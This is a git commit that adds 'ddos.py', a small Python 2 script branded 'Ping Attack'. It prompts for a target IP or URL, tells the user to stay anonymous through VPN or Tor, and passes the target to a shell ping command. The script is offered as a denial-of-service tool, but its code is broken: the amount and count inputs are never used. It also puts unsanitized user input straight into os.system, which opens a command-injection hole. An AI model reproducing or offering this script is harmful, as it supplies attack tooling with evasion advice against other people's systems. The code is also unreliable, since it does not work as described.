a105e08c9ee004d06fa33a11bec291e92a35e16c
overthe1577 <138641906+overthe1577@users.noreply.github.com>
2023-07-05 06:29:24 +0300

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,18 @@
+import os
+import sys
+os.system("clear")
+os.system( "toilet -f mono9 -F gay Ping Attack")
+print
+print  'Author  :  overthe(1577)'
+print
+print  'Github : https://github.com/overthe1577 '
+print  
+print 'Information  :  Use vpn/openvpn/tor/tor proxy network.Be anonymous.'
+print
+ip = raw_input("Target Url/Ip :")
+print
+t = input("Set Amount :")
+print
+c = input("Set Count :")
+print
+os.system("ping  {}  ".format(ip,t,c))
